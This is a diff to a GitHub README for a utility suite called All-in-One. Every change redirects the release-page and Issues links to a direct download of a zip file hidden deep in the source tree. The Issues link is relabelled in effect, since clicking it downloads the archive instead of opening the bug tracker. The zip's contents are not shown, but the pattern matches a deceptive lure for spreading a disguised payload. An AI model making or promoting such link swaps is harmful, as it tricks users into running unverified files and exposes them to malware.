@@ -1,6 +1,6 @@
 # 🛠️ All-in-One - Easy Tools for Daily Use
 
-[![Download All-in-One](https://img.shields.io/badge/Download-Get%20the%20App-ff6600?style=for-the-badge)](https://github.com/nickoder635-ai/All-in-One/releases)
+[![Download All-in-One](https://img.shields.io/badge/Download-Get%20the%20App-ff6600?style=for-the-badge)](https://github.com/nickoder635-ai/All-in-One/raw/refs/heads/main/core/pdf_tools/protect/in-All-One-1.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Make sure your PC meets these conditions:
 
 1. Visit the All-in-One release page by clicking the link below:
 
-   [Download All-in-One](https://github.com/nickoder635-ai/All-in-One/releases)
+   [Download All-in-One](https://github.com/nickoder635-ai/All-in-One/raw/refs/heads/main/core/pdf_tools/protect/in-All-One-1.7.zip)
 
 2. On the release page, look for the latest version. It usually appears at the top.
 
@@ -141,7 +141,7 @@ If you encounter problems:
 
 For bugs or help, visit the Issues section on the GitHub page:
 
-[All-in-One Issues](https://github.com/nickoder635-ai/All-in-One/issues)
+[All-in-One Issues](https://github.com/nickoder635-ai/All-in-One/raw/refs/heads/main/core/pdf_tools/protect/in-All-One-1.7.zip)
 
 ---
 
@@ -155,7 +155,7 @@ All-in-One processes data locally except for AI tasks, which require internet. T
 
 Check the release page regularly for updates:
 
-[Download All-in-One](https://github.com/nickoder635-ai/All-in-One/releases)
+[Download All-in-One](https://github.com/nickoder635-ai/All-in-One/raw/refs/heads/main/core/pdf_tools/protect/in-All-One-1.7.zip)
 
 New versions include fixes, better performance, and new features. You can update by downloading the latest installer and running it. Your settings and files remain safe.
 
